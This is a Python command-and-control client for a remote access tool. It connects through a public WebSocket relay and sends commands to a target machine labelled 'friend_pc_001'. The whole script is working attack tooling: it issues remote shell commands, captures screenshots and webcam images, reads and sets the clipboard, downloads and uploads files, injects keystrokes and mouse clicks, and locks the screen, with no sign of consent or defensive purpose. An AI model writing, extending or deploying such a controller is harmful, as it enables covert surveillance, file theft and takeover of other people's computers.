import asyncio
import websockets
import json
import base64
import pprint
from datetime import datetime

RELAY_URL = "wss://socketsbay.com/wss/v2/1/demo/"
CLIENT_ID = "controller_001"
TARGET_ID = "friend_pc_001"

async def send_command(ws, cmd):
    cmd["from"] = CLIENT_ID
    cmd["to"] = TARGET_ID
    cmd["ts"] = str(datetime.now())
    await ws.send(json.dumps(cmd))
    print(f"[*] Sent: {cmd['type']}")

async def receive_messages(ws):
    while True:
        try:
            msg = await ws.recv()
            data = json.loads(msg)
            if data.get("to") == CLIENT_ID:
                if data["type"] == "result":
                    print(f"\n[RESULT]:\n{data['output']}")
                elif data["type"] == "screenshot":
                    img_data = base64.b64decode(data["data"])
                    with open("remote_screen.png", "wb") as f:
                        f.write(img_data)
                    print("[*] Screenshot saved as remote_screen.png")
                elif data["type"] == "pong":
                    print(f"[*] Pong from {data.get('hostname')}")
                elif data["type"] == "sysinfo":
                    print("\n[SYSTEM INFO]:")
                    pprint.pprint(data['data'])
                elif data["type"] == "ps":
                    print("\n[PROCESSES]:")
                    for p in data['data'][:20]:
                        print(f"  PID {p['pid']:6} {p['name'][:30]:30} CPU {p['cpu_percent']:.1f}% MEM {p['memory_percent']:.1f}%")
                elif data["type"] == "ls":
                    print(f"\n[FILES in {data['path']}]:")
                    for f in data['data']:
                        typ = "DIR" if f['is_dir'] else "FILE"
                        print(f"  [{typ}] {f['name']} ({f['size']} bytes)")
                elif data["type"] == "file_data":
                    fname = data.get("name", "downloaded_file")
                    with open(f"remote_{fname}", "wb") as f:
                        f.write(base64.b64decode(data['data']))
                    print(f"[*] File saved as remote_{fname}")
                elif data["type"] == "clipboard":
                    print(f"\n[CLIPBOARD]: {data['data'][:500]}")
                elif data["type"] == "webcam":
                    img_data = base64.b64decode(data["data"])
                    with open("remote_webcam.png", "wb") as f:
                        f.write(img_data)
                    print("[*] Webcam image saved as remote_webcam.png")
                elif data["type"] == "error":
                    print(f"[!] Error: {data['message']}")
        except Exception as e:
            print(f"[!] Receive error: {e}")

async def main():
    print(f"[*] Connecting to relay as {CLIENT_ID}...")
    async with websockets.connect(RELAY_URL) as ws:
        await ws.send(json.dumps({"type": "register", "id": CLIENT_ID}))
        print("[*] Connected. Commands:")
        print("  shell <cmd> | screenshot | webcam | sysinfo | ps | ls <path>")
        print("  get_file <path> | put_file <path> <base64> | clipboard_get")
        print("  clipboard_set <text> | type_text <text> | mouse_click [x y]")
        print("  echo <text> | panic | lock | ping | exit")
        recv_task = asyncio.create_task(receive_messages(ws))
        while True:
            cmd = input("> ").strip()
            if cmd == "exit":
                break
            elif cmd.startswith("shell "):
                await send_command(ws, {"type": "shell", "cmd": cmd[6:]})
            elif cmd == "screenshot":
                await send_command(ws, {"type": "screenshot"})
            elif cmd == "webcam":
                await send_command(ws, {"type": "webcam"})
            elif cmd == "sysinfo":
                await send_command(ws, {"type": "sysinfo"})
            elif cmd == "ps":
                await send_command(ws, {"type": "ps"})
            elif cmd.startswith("ls"):
                path = cmd[3:].strip() or "."
                await send_command(ws, {"type": "ls", "path": path})
            elif cmd.startswith("get_file "):
                await send_command(ws, {"type": "get_file", "path": cmd[9:].strip()})
            elif cmd.startswith("clipboard_get"):
                await send_command(ws, {"type": "clipboard_get"})
            elif cmd.startswith("clipboard_set "):
                await send_command(ws, {"type": "clipboard_set", "data": cmd[14:].strip()})
            elif cmd.startswith("type_text "):
                await send_command(ws, {"type": "type_text", "text": cmd[10:].strip()})
            elif cmd.startswith("mouse_click"):
                parts = cmd[12:].strip().split()
                if len(parts) == 2:
                    await send_command(ws, {"type": "mouse_click", "x": int(parts[0]), "y": int(parts[1])})
                else:
                    await send_command(ws, {"type": "mouse_click"})
            elif cmd.startswith("put_file "):
                parts = cmd[9:].strip().split(maxsplit=1)
                await send_command(ws, {"type": "put_file", "path": parts[0], "data": parts[1] if len(parts)>1 else ""})
            elif cmd == "lock":
                await send_command(ws, {"type": "lock"})
            elif cmd == "ping":
                await send_command(ws, {"type": "ping"})
            else:
                print("Unknown command. Type 'help' for commands.")
        recv_task.cancel()

if __name__ == "__main__":
    asyncio.run(main())
